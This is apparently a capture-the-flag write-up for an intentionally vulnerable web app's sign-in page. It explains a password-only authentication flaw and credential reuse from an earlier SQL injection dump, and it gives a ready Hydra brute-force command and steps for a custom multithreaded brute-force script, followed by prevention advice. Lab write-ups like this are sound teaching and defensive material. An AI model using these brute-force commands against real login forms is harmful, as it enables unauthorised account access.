# Login Authentication Bypass + Brute Force

The login at `/?page=signin` checks only the password, not the username+password pair.
Any username with password `shadow` (discovered via the member SQL injection) succeeds.

## Exploit (quick — credential reuse)

Username: anything  
Password: `shadow` (MD5 from the member SQL injection dump, cracked online)

## Exploit (intended — brute force)

The login form uses GET:

```
/?page=signin&username=<user>&password=<pass>&Login=Login
```

Use [Hydra](https://github.com/vanhauser-thc/thc-hydra) with common wordlists, filtering on the failure indicator (`WrongAnswer.gif`):

```bash
hydra -L top-usernames-shortlist.txt \
      -P Most-Popular-Letter-Passes.txt \
      <IP> \
      http-get-form "/?page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer.gif"
```

Wordlists from [SecLists](https://github.com/danielmiessler/SecLists):
- `Passwords/Most-Popular-Letter-Passes.txt`
- `Usernames/top-usernames-shortlist.txt`

or use [`loginbruteforce.py`](../../loginbruteforce.py) (custom script for this challenge):

1. Open `../../loginbruteforce.py` and set these variables:

   ```python
   TARGET_URL = "http://<IP>/index.php?page=signin&Login=Login"
   USERLIST   = "path/to/top-usernames-shortlist.txt"
   PASSLIST   = "path/to/Most-Popular-Letter-Passes.txt"
   THREADS    = 5   # increase for speed, decrease if rate-limited
   ```

2. Install dependency and run:

   ```bash
   pip3 install requests
   python3 ../../loginbruteforce.py
   ```

   The script tests every username × password combination in parallel and stops as soon as a match is found (no `WrongAnswer.gif` in the response).

## How to prevent

- Always authenticate username **and** password together as a pair
- Rate-limit or lock accounts after repeated failed attempts
- Use strong password hashing (bcrypt, scrypt, PBKDF2) with a salt — never plain MD5
